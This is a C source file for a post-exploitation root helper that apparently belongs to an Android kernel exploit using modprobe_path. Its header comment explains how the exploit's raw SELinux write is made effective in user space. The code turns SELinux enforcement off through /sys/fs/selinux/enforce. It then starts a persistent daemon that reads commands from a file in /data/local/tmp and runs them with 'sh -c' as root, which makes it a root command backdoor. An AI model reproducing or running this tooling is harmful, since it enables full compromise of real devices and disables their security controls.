/*
 * mpnl.c - modprobe_path root helper + SELinux user-space enforcement sync.
 *
 * A drop-in alternative to mphelper.c that also turns the exploit's raw
 * `selinux_enforcing=0` write into a *real* user-space permissive state.
 *
 * Background: the exploit writes the kernel variable `selinux_enforcing` to 0
 * (kernel + `avc_denied()` become permissive), but Android's property_service
 * checks SELinux in *user space* via libselinux, which caches `avc->enforcing`
 * from boot and only refreshes it on the kernel's netlink SELNL_MSG_SETENFORCE
 * notice (or the /sys/fs/selinux/status page) - both emitted only by
 * sel_write_enforce().  A raw write skips them, so `setprop`/`settings` stay
 * denied (`permissive=0`).  A user-space forged notice is rejected
 * ("received spoofed netlink packet").
 *
 * Fix: the driver (fops.c, MP_PATH hook) marks the kernel type permissive in the
 * loaded policy (`policydb.permissive_map`), so security_compute_av[_user]()
 * sets AVD_FLAGS_PERMISSIVE for it.  With that in place this helper toggles
 * /sys/fs/selinux/enforce 1 -> 0 once at daemon start; the SECURITY__SETENFORCE
 * check then passes and the kernel runs the real path: selinux_enforcing=0 +
 * selnl_notify_setenforce(0) + status-page update -> init's cached libselinux
 * AVC reloads as permissive and property_service allows setprop from the
 * kernel domain.  See docs/SELINUX_USERSYNC.md.
 *
 * Command channel (same as mphelper.c):
 *   write a command to /data/local/tmp/rcmd -> run `sh -c <cmd>` as root ->
 *   output to /data/local/tmp/rout.  Do NOT delete rout/mp_ran (a kernel-spawned
 *   process cannot create new /data files; fscrypt ENOKEY) - pre-warm them.
 *   `!senforce` re-runs the enforcement sync.
 */
#define _GNU_SOURCE
#include <sys/wait.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>

static void wr_enforce(const char *v) {
  int f = open("/sys/fs/selinux/enforce", O_WRONLY);
  if (f >= 0) { ssize_t w = write(f, v, 1); (void)w; close(f); }
}

static void logf_(const char *p, const char *s) {
  int f = open(p, O_WRONLY | O_CREAT | O_APPEND, 0644);
  if (f >= 0) { ssize_t w = write(f, s, strlen(s)); (void)w; close(f); }
}

/* new_value 1 != selinux_enforcing(0): sel_write_enforce() runs its real body;
 * then 0 != 1: it sets selinux_enforcing=0 and emits the setenforce notice. */
static void sync_selinux(void) {
  wr_enforce("1");
  usleep(50000);
  wr_enforce("0");
}

int main(int argc, char **argv) {
  (void)argc; (void)argv;
  setgid(0);
  setuid(0);

  int f = open("/data/local/tmp/mp_ran", O_WRONLY | O_CREAT | O_TRUNC, 0644);
  if (f >= 0) {
    char b[160];
    int n = snprintf(b, sizeof(b), "mpnl uid=%d euid=%d gid=%d pid=%d\n",
                     getuid(), geteuid(), getgid(), getpid());
    if (n > 0) { ssize_t w = write(f, b, n); (void)w; }
    close(f);
  }

  pid_t d = fork();
  if (d == 0) {
    setsid();
    sync_selinux();
    char m[64];
    int e0 = open("/sys/fs/selinux/enforce", O_RDONLY);
    char ev = '?';
    if (e0 >= 0) { ssize_t r = read(e0, &ev, 1); (void)r; close(e0); }
    snprintf(m, sizeof(m), "selinux sync done; enforce now=%c\n", ev);
    logf_("/data/local/tmp/mp_ran", m);

    for (;;) {
      int rf = open("/data/local/tmp/rcmd", O_RDONLY);
      if (rf >= 0) {
        char cmd[1024];
        ssize_t n = read(rf, cmd, sizeof(cmd) - 1);
        close(rf);
        if (n > 0) {
          cmd[n] = 0;
          if (strncmp(cmd, "!senforce", 9) == 0) {
            sync_selinux();
            int of = open("/data/local/tmp/rout", O_WRONLY | O_CREAT | O_TRUNC, 0644);
            if (of >= 0) { ssize_t w = write(of, "selinux resync\n", 15); (void)w; close(of); }
          } else {
            int of = open("/data/local/tmp/rout", O_WRONLY | O_CREAT | O_TRUNC, 0644);
            pid_t p = fork();
            if (p == 0) {
              if (of >= 0) { dup2(of, 1); dup2(of, 2); }
              execl("/system/bin/sh", "sh", "-c", cmd, (char *)NULL);
              _exit(127);
            }
            if (of >= 0) close(of);
            waitpid(p, NULL, 0);
          }
          int tf = open("/data/local/tmp/rcmd", O_WRONLY | O_TRUNC);
          if (tf >= 0) close(tf);
        }
      }
      usleep(300000);
    }
  }
  return 0;
}
